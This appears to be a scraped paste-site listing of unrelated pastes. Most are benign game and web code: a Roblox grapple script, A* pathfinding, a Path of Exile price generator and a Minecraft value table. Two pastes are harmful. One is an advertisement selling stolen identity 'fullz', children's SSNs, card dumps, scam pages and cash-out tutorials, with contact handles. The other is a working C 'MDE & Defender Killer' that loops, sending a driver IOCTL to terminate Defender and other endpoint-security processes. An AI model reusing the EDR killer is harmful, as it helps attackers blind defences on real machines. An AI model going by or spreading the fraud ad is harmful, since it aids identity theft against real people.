cooldownFill.Size = UDim2.new(1, 0, 1, 0)
cooldownFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
cooldownFill.BorderSizePixel = 0
cooldownFill.Parent = cooldownBar

-- buttons for mobile users
if UserInputService.TouchEnabled then
	local grappleButton = Instance.new(""TextButton"")
	grappleButton.Size = UDim2.new(0, 100, 0, 40)
	grappleButton.Position = UDim2.new(1, -110, 1, -100)
	grappleButton.Text = ""Grapple""
	grappleButton.BackgroundColor3 = Color3.fromRGB(70, 70, 255)
	grappleButton.TextColor3 = Color3.new(1, 1, 1)
	grappleButton.Font = Enum.Font.SourceSansBold
	grappleButton.TextSize = 20
	grappleButton.Parent = ui

	local climbButton = Instance.new(""TextButton"")
	climbButton.Size = UDim2.new(0, 100, 0, 40)
	climbButton.Position = UDim2.new(1, -110, 1, -150)
	climbButton.Text = ""Climb""
	climbButton.BackgroundColor3 = Color3.fromRGB(70, 255, 70)
	climbButton.TextColor3 = Color3.new(1, 1, 1)
	climbButton.Font = Enum.Font.SourceSansBold
	climbButton.TextSize = 20
	climbButton.Parent = ui

	-- hook up buttons to actions
	grappleButton.MouseButton1Click:Connect(function()
		fireGrapple()
	end)

	climbButton.MouseButton1Click:Connect(function()
		startClimbing()
	end)
end

-- does the cooldown bar anim
local function showCooldown(duration)
	cooldownBar.Visible = true
	cooldownFill.Size = UDim2.new(1, 0, 1, 0)

	local tween = TweenService:Create(cooldownFill, TweenInfo.new(duration), {
		Size = UDim2.new(0, 0, 1, 0)
	})
	tween:Play()
	tween.Completed:Wait()

	cooldownBar.Visible = false
end

-- draws the beam from player to point
local function setupGrappleVisual()
	local a1 = Instance.new(""Attachment"")
	a1.Name = ""GrappleStart""
	a1.Position = Vector3.zero
	a1.Parent = rootPart

	local a2 = Instance.new(""Attachment"")
	a2.Name = ""GrappleEnd""
	a2.Parent = workspace.Terrain

	local b = Instance.new(""Beam"")
	b.Attachment0 = a1
	b.Attachment1 = a2
	b.Width0 = 0.1
	b.Width1 = 0.1
	b.Color = ColorSequence.new(Color3.fromRGB(200, 200, 255))
	b.LightEmission = 1
	b.FaceCamera = true
	b.Parent = a1

	attachments.start = a1
	attachments.end_ = a2
	beam = b
end

-- kills the visual
local function removeGrappleVisual()
	if beam then beam:Destroy() end
	if attachments.start then attachments.start:Destroy() end
	if attachments.end_ then attachments.end_:Destroy() end
	attachments = {}
	beam = nil
end

-- checks if there's a wall in front
local function isNearWall()
	local rayOrigin = rootPart.Position
	local rayDirection = rootPart.CFrame.LookVector * WALL_CHECK_DISTANCE

	local raycastParams = RaycastParams.new()
	raycastParams.FilterDescendantsInstances = {character}
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude

	local result = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
	if result and result.Instance and not result.Instance:IsDescendantOf(character) then
		return true, result.Position
	end
	return false
end

-- handles grapple move step
local function moveTo(position)
	local direction = (position - rootPart.Position)
	local distance = direction.Magnitude
	local duration = distance / GRAPPLE_SPEED
	local t0 = tick()

	state:set(""Grappling"")
	isGrappling = true

	RunService:BindToRenderStep(""GrappleStep"", Enum.RenderPriority.Character.Value + 1, function()
		local dt = tick() - t0
		if dt >= duration or not grapplePoint then
			RunService:UnbindFromRenderStep(""GrappleStep"")
			isGrappling = false
			state:set(""Cooldown"")
			task.delay(COOLDOWN_TIME, function()
				if not isClimbing then
					state:set(""Idle"")
				end
			end)
			showCooldown(COOLDOWN_TIME)
			removeGrappleVisual()
			return
		end

		local step = rootPart.CFrame.Position:Lerp(grapplePoint, math.clamp(dt / duration, 0, 1))
		local look = (grapplePoint - rootPart.Position).Unit
		rootPart.CFrame = CFrame.new(step, step + look)

		if attachments.end_ then
			attachments.end_.WorldPosition = grapplePoint
		end
	end)
end

-- shoot ray from mouse, see what we hit
function fireGrapple()
	if isGrappling or isClimbing or state.current ~= ""Idle"" then return end

	local mousePos = UserInputService:GetMouseLocation()
	local unitRay = camera:ViewportPointToRay(mousePos.X, mousePos.Y)
	local rayOrigin = unitRay.Origin
	local rayDirection = unitRay.Direction * 1000

	local raycastParams = RaycastParams.new()
	raycastParams.FilterDescendantsInstances = {character}
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude

	local result = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
	if not result or not result.Instance then return end

	grapplePoint = result.Position
	setupGrappleVisual()
	moveTo(result.Position)
end

-- starts climbing if near wall
function startClimbing()
	if isClimbing or isGrappling or state.current ~= ""Idle"" then return end
	local nearWall, wallPos = isNearWall()
	if not nearWall then return end

	state:set(""Climbing"")
	isClimbing = true
	local climbStart = tick()

	humanoid.PlatformStand = true
	rootPart.Velocity = Vector3.new(0, 0, 0)

	RunService:BindToRenderStep(""ClimbStep"", Enum.RenderPriority.Character.Value + 2, function()
		local dt = tick() - climbStart
		if dt > CLIMB_DURATION then
			RunService:UnbindFromRenderStep(""ClimbStep"")
			humanoid.PlatformStand = false
			isClimbing = false
			state:set(""Cooldown"")
			task.delay(COOLDOWN_TIME, function()
				if not isGrappling then
					state:set(""Idle"")
				end
			end)
			showCooldown(COOLDOWN_TIME)
			return
		end

		local climbSpeed = CLIMB_SPEED * dt
		local newPos = rootPart.Position + Vector3.new(0, climbSpeed, 0)
		rootPart.CFrame = CFrame.new(newPos, newPos + rootPart.CFrame.LookVector)
	end)
end

-- right click = grapple, left = climb
UserInputService.InputBegan:Connect(function(input, processed)
	if processed then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		fireGrapple()
	elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
		startClimbing()
	end
end)

-- reset stuff on death
humanoid.Died:Connect(function()
	state:set(""Idle"")
	isClimbing = false
	isGrappling = false
	removeGrappleVisual()
end)

-- rebind stuff when respawn
player.CharacterAdded:Connect(function(char)
	character = char
	humanoid = char:WaitForChild(""Humanoid"")
	rootPart = char:WaitForChild(""HumanoidRootPart"")
	state:set(""Idle"")
end)

-- keep backpack gui on
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)"
KUtRzN8q,SSN DOB DL FULLZ CHILDREN FULLZ REAL DL FRONTBACK SELFIE USA_UK_CANADA,hacksp007,Java,Tuesday 22nd of July 2025 03:28:00 PM CDT,"FRESH DATABASE FULLZ

USA UK CANADA
SSN DOB DL|NIN DOB DL|SIN DOB DL
SSN DOB DL ADDRESS EMPLOYEE INFO & ACCOUN & ROUTING NUMBER
NIN DOB DL ADDRESS SRT CODE & ACCOUNT NUMBER
SIN DOB DL ADDRESS MMN EMAIL PHONE

REAL ID & DL CARDS Front Back with Selfie
Business EIN Company Pros & EIN Lookup

High Credit Score Pros with 700+ Scores
CC with CVV & Billing Address

Children Fullz SSN DOB ADDRESS 2011-2023
Old & Young Age Fullz 1925-2010

KYC Stuff for Uber Eats & Door Dash
Fullz for FASFA Available

Providing specific details fullz as well
Filter with Gender|DOB|CITI|STATES|ZIPCODES
SSN Lookup & SSN Card front

Utilities Bill & Bank Statements
Sweep Stakes|Casino & Crypto Leads
Dumps with CVV & Tutorials of Cahsing out

Sc@m Pages & Tools for Sp@mming & Scripting
Loan Methods|Carding Methods|CC Methods

#FULLZ #SSNFULLZ #UKFULLZNIN #CANADAFULLZ #SINFULLZ
#SSNDOBDL #FASFA #UBEREATS #DOORDASH #CRYPTO #TOOLS #LEADS
#PAYDAYLEADS #CRRYPTOLEADS #SWEEPSTAKES #CVVSELL #DUMPSCVV

CONTACT US HERE
TG @ KILLHACKS & @ LEADSUPLLIER
WHTSAPP +1727 7886129
EMAIL HACKSP007 AT GMAIL DOT COM"
ZXSkQnZB,Untitled,s44d47l4,C,Tuesday 22nd of July 2025 02:10:17 PM CDT,"#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string.h>

#define IOCTL_CODE 0x82730030  // IOCTL to terminate process
#define DEVICE_PATH L""\\\\.\\viragtlt""  // Symbolic link to the driver

// Structure sent to the driver
struct ProcNameStruct {
    char procName[500];
};

// Function to convert wchar_t* to char*
void WideCharToChar(const wchar_t* wStr, char* cStr, size_t size) {
    size_t converted;
    wcstombs_s(&converted, cStr, size, wStr, _TRUNCATE);
}

// Function to find process by name and get PID
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L""[-] Failed to create snapshot. Error: %d\n"", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Iterate through processes to find target
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return processId;
}

// Function to send IOCTL to driver to kill process
int KillProcessByName(HANDLE hDevice, const wchar_t* processName) {
    struct ProcNameStruct ioctlData;
    ZeroMemory(&ioctlData, sizeof(ioctlData));

    // Convert wide string to narrow string
    WideCharToChar(processName, ioctlData.procName, sizeof(ioctlData.procName) - 1);
    ioctlData.procName[sizeof(ioctlData.procName) - 1] = '\0';

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_CODE,
        &ioctlData,
        sizeof(ioctlData),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {
        printf(""[-] Failed to send IOCTL to kill %s. Error: %d\n"", ioctlData.procName, GetLastError());
        return 0;
    }

    printf(""[+] Successfully sent IOCTL to kill %s.\n"", ioctlData.procName);
    return 1;
}

// Main loop to terminate Defender and MDE processes
int main() {
    wprintf(L""[+] Starting MDE & Defender Killer...\n"");

    // Open handle to the driver
    HANDLE hDevice = CreateFileW(
        DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        wprintf(L""[-] Failed to open handle to %s. Error: %d\n"", DEVICE_PATH, GetLastError());
        return 1;
    }
    wprintf(L""[+] Successfully opened handle to driver.\n"");

    // Target processes to terminate
    const wchar_t* targetProcesses[] = { L""MsMpEng.exe"", L""CynetMS.exe"", L""smartscreen.exe"", L""SenseTVM.exe"", 
        L""SenseNdr.exe"", L""SenseIR.exe"", L""NisSrv.exe"", L""CynetEPS.exe"", L""CybergON-Kronk-signed.exe"", 
        L""elmecagent-updater.exe"", L""elmecagent-watchdog.exe""};
    
    int numProcesses = sizeof(targetProcesses) / sizeof(targetProcesses[0]);

    // Infinite loop to continuously check and kill the processes
    while (1) {
        int foundProcess = 0;

        // Loop over all target processes
        for (int i = 0; i < numProcesses; ++i) {
            const wchar_t* target = targetProcesses[i];
            DWORD pid = GetProcessIdByName(target);

            if (pid != 0) {
                wprintf(L""[+] Found %s with PID: %d\n"", target, pid);
                if (KillProcessByName(hDevice, target)) {
                    wprintf(L""[+] Successfully terminated %s.\n"", target);
                }
                else {
                    wprintf(L""[-] Failed to terminate %s.\n"", target);
                }
                foundProcess = 1;
            }
            else {
                wprintf(L""[-] %s not found.\n"", target);
            }
        }

        if (!foundProcess) {
            wprintf(L""[*] No target processes found. Sleeping for 5 seconds...\n"");
        }

        // Sleep for 5 seconds before checking again
        Sleep(5000);
    }

    CloseHandle(hDevice);
    return 0;
}
"
DfaNcKk7,Untitled,shahilsaha,C#,Tuesday 22nd of July 2025 01:00:23 PM CDT,"public class AStar : BasePathfinding
{
    protected override PathResult FindPath(Node start, Node goal, HashSet<Node> allowedNodes = null)
    {
        List<Node> openList = new List<Node>();
        HashSet<Node> closedList = new HashSet<Node>();

        openList.Add(start);
        start.gCost = 0; // Cost of the start node is 0
        start.hCost = HeuristicHelper.GetManhattanDistance(start, goal); // Heuristic cost from start to end
        start.fCost = start.gCost + start.hCost; // Total cost of the path from start to end

        // while there are nodes in the open list
        while (openList.Count > 0)
        {
            // Get the current Node with the lowest fCost
            Node currentNode = HeuristicHelper.FindLowestF(openList);

            // if the node is there in the open list, move it to the closed list
            if (openList.Contains(currentNode))
                openList.Remove(currentNode);

            closedList.Add(currentNode);

            // if the goal node is the current node, retrace the path and return it
            if (currentNode == goal)
            {
                var (path, totalCost) = HeuristicHelper.RetracePath(start, goal);
                return new PathResult
                {
                    Path = path,
                    PathLength = path.Count,
                    PathCost = totalCost,
                };
            }

            // Else, get all the neighbors of the current node
            var neighbors = currentNode.GetNeighbors();

            // Loop through each neighbor
            foreach (var neighbor in neighbors)
            {
                // If the neighbor is already in the closed list or is blocked, skip it
                if (closedList.Contains(neighbor) || !HeuristicHelper.IsNodeAllowed(neighbor, allowedNodes))
                    continue;

                // Gets the distance from the current node to the neighbor
                float tentativeGCost =
                    currentNode.gCost + HeuristicHelper.GetManhattanDistance(currentNode, neighbor);

                // calculate the cost of the path to the neighbor
                if (tentativeGCost < neighbor.gCost || !openList.Contains(neighbor))
                {
                    neighbor.gCost = tentativeGCost;
                    neighbor.hCost = HeuristicHelper.GetManhattanDistance(neighbor, goal);
                    neighbor.fCost = neighbor.gCost + neighbor.hCost;
                    neighbor.parent = currentNode;

                    // Add it to the open list if it is not already there
                    if (!openList.Contains(neighbor))
                        openList.Add(neighbor);
                }
            }
        }

        // No path was found, return null
        return null;
    }
}
"
bmpGjKJa,Untitled,shahilsaha,C#,Tuesday 22nd of July 2025 12:40:59 PM CDT,"public class PathfindingEvaluator : MonoBehaviour
{
    [SerializeField] private Grid3D mGrid;
    [SerializeField] private PathfindingManager mPathManager;
    private List<EvaluationResult> evaluationResults = new List<EvaluationResult>();

    public List<EvaluationResult> GetEvaluationResults() => evaluationResults;

    public EvaluationResult Evaluate(int evalSize)
    {
        // Pre evaluation
        if (evalSize <= 0)
        {
            Debug.LogError(""Evaluation size must be greater than 0."");
            return null;
        }

        // -- Clear data if exists.
        ClearResults();

        var nodes = mGrid.GetStartEndNodes();

        // Evaluate the algorithms
        StartEvaluation(evalSize, nodes.start, nodes.goal);

        // Post evaluation
        if (evaluationResults.Count <= 0) return null;

        return evaluationResults[evalSize - 1];
    }

    public void ClearResults()
    {
        if (evaluationResults != null && evaluationResults.Count > 0)
            evaluationResults.Clear();
    }

    private void StartEvaluation(int evalSize, Node start, Node goal)
    {
        int count = 0;

        while (count < evalSize)
        {
            var results = GatherEvaluationData(start, goal);
            evaluationResults.Add(results);
            count++;
        }
    }

    private EvaluationResult GatherEvaluationData(Node start, Node goal)
    {
        var aStar = EvaluationResult.FromPathResult(mPathManager.RunAStar(start, goal));
        var ilsWithAStar = EvaluationResult.FromPathResult(mPathManager.RunILSWithAStar(start, goal));
        var gbfs = EvaluationResult.FromPathResult(mPathManager.RunGBFS(start, goal));
        var ilsWithGBFS = EvaluationResult.FromPathResult(mPathManager.RunILSWithGBFS(start, goal));

        return new EvaluationResult
        {
            AStar = aStar,
            ILSWithAStar = ilsWithAStar,
            GBFS = gbfs,
            ILSWithGBFS = ilsWithGBFS,
        };
    }
}"
ky1McsBH,Blossom 03 - โรล,Kelly-B9978,HTML,Tuesday 22nd of July 2025 12:27:17 PM CDT,"<!--
[คู่มือการแก้ไขโคด] 
ตำแหน่งภาพ : เพิ่ม --olv-pos: 50% 50%; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - เลขตัวแรกคือการขยับซ้าย - ขวา โดย 0% = ชิดซ้าย 100% = ชิดขวา
 - เลขตัวแรกคือการขยับขึ้น - ลง โดย 0% = ชิดบน 100% = ชิดล่าง
 
ขนาดภาพ : เพิ่ม --olv-size: cover; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - cover คือ ขยายเต็มพื้นที่
 - 100% คือ ขนาดเดิมของรูป
 - มากกว่า 100% คือ ขนาดใหญ่ขึ้น
 - น้อยกว่า 100% คือ ขนาดเล็กลง
-->

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Josephine  <br>    Starling</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(--ลิงก์รูป--);""></div>
<h1 class=""olive-name"">Bellanie  <br>   Avendell</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>

<link href=""https://dl.dropbox.com/scl/fi/j05ok8um0jda9e1hb34su/blossom3.css?rlkey=vaksp9lwuwth3w96g9ziudjx8&st=zvtwfknt"" rel=""stylesheet"">
<div id=""Blossom3""><a href=""https://discord.com/users/625292873914515456/""></a><div id=""olive-role"" class=""olive-box"">
<div class=""olive-leaf1""></div><div class=""olive-leaf2""></div>
<div class=""olive-title"">03 Blossom Rd.</div>
<div class=""olive-pic"" style=""--olv-pic: url(https://i.pinimg.com/1200x/f2/79/41/f279413431dc6c8c8427d9bf11f1eae3.jpg);--olv-pos: 50% 40%;""></div>
<h1 class=""olive-name"">Desdemona</h1>
<div class=""olive-content"">
--เนื้อหาโรลเพลย์--
<hr>
[b]หมายเหตุ[/b] หมายเหตุ
</div>
</div></div>"
YtitgPZA,poe pricecheck,Old_Shinigami,JavaScript,Tuesday 22nd of July 2025 12:23:00 PM CDT,"var Currency = [
[""Rogue's Marker"",27],
[""Scroll of Wisdom"",100],
[""Portal Scroll"",250],
[""Orb of Transmutation"",400],
[""Wild Crystallised Lifeforce"",414],
[""Jeweller's Orb"",440],
[""Primal Crystallised Lifeforce"",488],
[""Vivid Crystallised Lifeforce"",500],
[""Lesser Eldritch Ichor"",800],
[""Orb of Alchemy"",1000],
[""Orb of Binding"",1100],
[""Blacksmith's Whetstone"",1250],
[""Chromatic Orb"",1300],
[""Engineer's Orb"",1430],
[""Orb of Chance"",1500],
[""Instilling Orb"",1667],
[""Orb of Augmentation"",1700],
[""Orb of Fusing"",1760],
[""Orb of Alteration"",2000],
[""Lesser Eldritch Ember"",2200],
[""Armourer's Scrap"",2500],
[""Orb of Horizons"",4000],
[""Orb of Unmaking"",4700],
[""Blessed Orb"",5000],
[""Vaal Orb"",5500],
[""Greater Eldritch Ichor"",6000],
[""Glassblower's Bauble"",6500],
[""Orb of Scouring"",7000],
[""Tainted Blacksmith's Whetstone"",7400],
[""Regal Orb"",8000],
[""Tainter Jeweller's Orb"",8500],
[""Cartographer's Chisel"",9000],
[""Chaos Orb"",10000],
[""Orb of Regret"",11250],
[""Tainted Armourer's Scrap"",15000],
[""Enkindling Orb"",16000],
[""Greater Eldritch Ember"",17000],
[""Gemcutter's Prism"",20000],
[""Tainted Chromatic Orb"",21000],
[""Harbinger's Orb"",27500],
[""Stacked Deck"",30000],
[""Grand Eldritch Ichor"",36000],
[""Orb of Annulment"",55000],
[""Tainted Mythic Orb"",66600],
[""Tainted Orb of Fusing"",70000],
[""Tainted Chaos Orb"",73300],
[""Ancient Orb"",80000],
[""Grand Eldritch Ember"",136700],
[""Exalted Orb"",200000],
[""Eldritch Exalted Orb"",310000],
[""Maven's Chisel of Scarabs"",320000],
[""Maven's Chisel of Procurement"",330000],
[""Maven's Chisel of Divination"",430000],
[""Sacred Orb"",450000],
[""Eldritch Orb of Annulment"",460000],
[""Velied Chaos Orb"",500000],
[""Eldritch Chaos Orb"",580000],
[""Maven's Chisel of Proliferation"",660000],
[""Maven's Chisel of Avarice"",1150000],
[""Sacred Crystallised Lifeforce"",1280000],
[""Tainted Exalted Orb"",1700000],
[""Divine Orb"",2050000],
[""Exceptional Eldritch Ichor"",2200000],
[""Tempering Orb"",2270000],
[""Exceptional Eldritch Ember"",2790000],
[""Redeemer's Exalted Orb"",4100000],
[""Orb of Conflict"",4300000],
[""Warlord's Exalted Orb"",4510000],
[""Tailoring Orb"",5130000],
[""Hunter's Exalted Orb"",6150000],
[""Crusader's Exalted Orb"",6970000],
[""Awakener's Orb"",9640000],
[""Fracturing Orb"",14350000],
[""Orb of Dominance"",15170000],
[""Tainted Divine Teardrop"",15370000],
[""Velied Exalted Orb"",61500000],
[""Reflecting Mist"",65600000],
[""Hinekora's Lock"",348500000],
[""Mirror of Kalandra"",2255000000]], priceRange = [
[1e3,1e4,3,0,9],
[1e4,1e5,10,0,32],
[1e5,1e6,25,0,46],
[1e6,1e7,56,0,57],
[1e7,1e8,87,10,71],
[1e8,1e9,102,33,76],
[3e9,1e10,109,47,78],
[1e10,1e11,112,58,78]];
var r = Math.floor(Math.random()*priceRange[priceRange.length-1][2]),tier = 0;
for (let i=0; i<priceRange.length-1; i++) if (r>=priceRange[i][2]) tier = i+1;
var curr = priceRange[tier][3]+Math.floor(Math.random()*(1+priceRange[tier][4]-priceRange[tier][3]));
var price = priceRange[tier][0]+Math.floor(Math.random()*(1+priceRange[tier][1]-priceRange[tier][0]));
price = Math.floor(price/Currency[curr][1]);
if (price>=1000) price = price.toString().split('').reverse().join('').replace(/(.{3})(?=.)/g,""$1."").split('').reverse().join('');
var s = price+""x ""+Currency[curr][0]; s"
HUS3XvXp,Untitled,Ethan_M,C#,Tuesday 22nd of July 2025 12:15:01 PM CDT,"using GamePlay;
using GamePlay.Entities;
using GamePlay.Factory;
using GamePlay.MapFeatures;
using Networking;
using Networking.Entities;
using UnityEngine;
using Reflex.Core;
using Services;
using UI;
namespace Infrastructure
{
	public class ProjectInstaller : MonoBehaviour, IInstaller
	{
		public void InstallBindings(ContainerBuilder containerBuilder)
		{
			containerBuilder.AddSingleton(typeof(AssetProvider), typeof(IAssetProvider));
			containerBuilder.AddSingleton(typeof(StaticDataService), typeof(IStaticDataService));
			containerBuilder.AddSingleton(typeof(JsonToFileStorageService), typeof(IStorageService));
			containerBuilder.AddSingleton(typeof(StandaloneInputService), typeof(IInputService));
			containerBuilder.AddSingleton(typeof(SceneLoader), typeof(SceneLoader));
			containerBuilder.AddSingleton(typeof(MapConfigureLoader), typeof(IMapConfigureLoader));
# if LOCAL_BUILD
			containerBuilder.AddSingleton(typeof(LocalAvatarLoader), typeof(IAvatarLoader));
#else
			containerBuilder.AddSingleton(typeof(SteamAvatarLoader), typeof(IAvatarLoader));
#endif
			BindFactories(containerBuilder);
		}

		private static void BindFactories(ContainerBuilder containerBuilder)
		{
			containerBuilder.AddSingleton(typeof(ParticleFactory), typeof(IParticleFactory));
			containerBuilder.AddSingleton(typeof(MeshFactory), typeof(IMeshFactory));
			containerBuilder.AddSingleton(typeof(UIFactory), typeof(IUIFactory));
			containerBuilder.AddSingleton(typeof(NetworkEntityFactory), typeof(IEntityFactory));
			containerBuilder.AddSingleton(typeof(InventoryFactory), typeof(IInventoryFactory));
			containerBuilder.AddSingleton(typeof(CharacterFactory), typeof(ICharacterFactory));
			containerBuilder.AddSingleton(typeof(NetworkingFactory), typeof(INetworkingFactory));
		}
	}
}"
A2XyZE9Y,emc_lookup.lua,Ramog,Lua,Tuesday 22nd of July 2025 11:40:06 AM CDT,"local lookuptableJson = [[
{
  ""minecraft:name_tag|0"": 192,
  ""quark:stained_planks_black_slab|0"": 4,
  ""minecraft:wooden_button|0"": 8,
  ""blockcraftery:editable_inner_corner_reinforced|0"": 24,
  ""quark:midori_block_stairs|0"": 6,
  ""quark:colored_flowerpot_green|0"": 56,
  ""ironchest:diamond_crystal_chest_upgrade|0"": 72,
  ""quark:stained_clay_tiles_pink_stairs|0"": 48,
  ""minecraft:deadbush|0"": 1,
  ""minecraft:apple|0"": 128,
  ""forestry:stairs.cocobolo|0"": 6,
  ""minecraft:observer|0"": 390,
  ""quark:end_bricks_wall|0"": 1,
  ""minecraft:iron_sword|0"": 516,
  ""ironchest:iron_shulker_box_purple|6"": 33353,
  ""ironchest:iron_shulker_box_purple|5"": 32849,
  ""ironchest:iron_shulker_box_purple|4"": 8260,
  ""ironchest:iron_shulker_box_purple|3"": 5184,
  ""ironchest:iron_shulker_box_purple|2"": 32841,
  ""ironchest:iron_shulker_box_purple|1"": 16456,
  ""ironchest:iron_shulker_box_purple|0"": 6208,
  ""quark:elder_prismarine_stairs|0"": 96,
  ""chisel:planks-oak|6"": 8,
  ""minecraft:wool|7"": 52,
  ""chisel:planks-oak|7"": 8,
  ""minecraft:wool|6"": 50,
  ""chisel:planks-oak|4"": 8,
  ""minecraft:wool|5"": 51,
  ""chisel:planks-oak|5"": 8,
  ""minecraft:wool|4"": 50,
  ""chisel:planks-oak|2"": 8,
  ""buildcrafttransport:pipe_iron_item|16"": 64,
  ""minecraft:wool|3"": 50,
  ""chisel:planks-oak|3"": 8,
  ""minecraft:wool|2"": 50,
  ""chisel:planks-oak|0"": 8,
  ""minecraft:wool|1"": 50,
  ""minecraft:rabbit_stew|0"": 198,
  ""chisel:planks-oak|1"": 8,
  ""minecraft:wool|0"": 48,
  ""chisel:planks-oak|14"": 8,
  ""minecraft:wool|15"": 50,
  ""minecraft:wool|14"": 50,
  ""chisel:planks-oak|12"": 8,
  ""minecraft:wool|13"": 49,
  ""chisel:planks-oak|13"": 8,
  ""minecraft:wool|12"": 64,
  ""chisel:planks-oak|10"": 8,
  ""minecraft:wool|11"": 156,
  ""chisel:planks-oak|11"": 8,
  ""minecraft:wool|10"": 103,
  ""chisel:planks-oak|8"": 8,
  ""minecraft:wool|9"": 102,
  ""chisel:planks-oak|9"": 8,
  ""minecraft:wool|8"": 50,
  ""buildcrafttransport:pipe_iron_item|4"": 64,
  ""buildcrafttransport:pipe_iron_item|5"": 64,
  ""buildcrafttransport:pipe_iron_item|6"": 64,
  ""buildcrafttransport:pipe_iron_item|7"": 64,
  ""extratrees:doors.yew|0"": 16,
  ""buildcrafttransport:pipe_iron_item|1"": 64,
  ""buildcrafttransport:pipe_iron_item|2"": 64,
  ""buildcrafttransport:pipe_iron_item|3"": 64,
  ""buildcrafttransport:pipe_iron_item|12"": 64,
  ""buildcrafttransport:pipe_iron_item|13"": 64,
  ""buildcrafttransport:pipe_iron_item|14"": 64,
  ""buildcrafttransport:pipe_iron_item|15"": 64,
  ""buildcrafttransport:pipe_iron_item|8"": 64,
  ""buildcrafttransport:pipe_iron_item|9"": 64,
  ""quark:midori_pillar|0"": 8,
  ""buildcrafttransport:pipe_iron_item|10"": 64,
  ""buildcrafttransport:pipe_iron_item|11"": 64,
  ""quark:birch_trapdoor|0"": 8,
  ""cathedral:cathedral_gargoyle_demon_quartz|0"": 4345,
  ""minecraft:iron_horse_armor|0"": 1584,
  ""projectred-exploration:stone_sickle|0"": 16,
  ""quark:vertical_stained_planks|7"": 8,
  ""quark:candle|15"": 72,
  ""quark:vertical_stained_planks|6"": 8,
  ""quark:candle|14"": 72,
  ""quark:vertical_stained_planks|5"": 8,
  ""quark:candle|13"": 71,
  ""quark:vertical_stained_planks|4"": 8,
  ""quark:candle|12"": 86,
  ""quark:vertical_stained_planks|3"": 8,
  ""quark:candle|11"": 178,
  ""quark:vertical_stained_planks|2"": 8,
  ""quark:candle|10"": 125,
  ""quark:vertical_stained_planks|1"": 8,
  ""quark:candle|9"": 124,
  ""quark:vertical_stained_planks|0"": 8,
  ""quark:candle|8"": 72,
  ""quark:vertical_stained_planks|15"": 8,
  ""extratrees:stairs.purpleheart|0"": 6,
  ""minecraft:light_weighted_pressure_plate|0"": 4096,
  ""quark:candle|7"": 74,
  ""quark:vertical_stained_planks|14"": 8,
  ""quark:candle|6"": 72,
  ""quark:vertical_stained_planks|13"": 8,
  ""quark:candle|5"": 73,
  ""quark:vertical_stained_planks|12"": 8,
  ""quark:candle|4"": 72,
  ""quark:vertical_stained_planks|11"": 8,
  ""quark:candle|3"": 72,
  ""quark:vertical_stained_planks|10"": 8,
  ""quark:candle|2"": 72,
  ""quark:vertical_stained_planks|9"": 8,
  ""quark:candle|1"": 72,
  ""quark:vertical_stained_planks|8"": 8,
  ""quark:candle|0"": 70,
  ""minecraft:purpur_stairs|0"": 144,
  ""ic2:itemcellempty|2"": 128,
  ""ic2:itemcellempty|0"": 64,
  ""ic2:itemcellempty|1"": 64,
  ""cathedral:cathedral_gargoyle_demon_basalt|0"": 253,
  ""buildcrafttransport:pipe_iron_power|16"": 128,
  ""quark:stained_clay_tiles_gray_slab|0"": 32,
  ""ic2:itemmisc|453"": 320,
  ""projectred-exploration:sapphire_axe|0"": 3080,
  ""mocreatures:deep_wyvstone|0"": 1,
  ""buildcrafttransport:pipe_iron_power|2"": 128,
  ""buildcrafttransport:pipe_iron_power|3"": 128,
  ""buildcrafttransport:pipe_iron_power|1"": 128,
  ""buildcrafttransport:pipe_iron_power|6"": 128,
  ""extratrees:fence.gates.box|0"": 32,
  ""buildcrafttransport:pipe_iron_power|7"": 128,
  ""buildcrafttransport:pipe_iron_power|4"": 128,
  ""buildcrafttransport:pipe_iron_power|5"": 128,
  ""buildcrafttransport:pipe_iron_power|10"": 128,
  ""buildcrafttransport:pipe_iron_power|11"": 128,
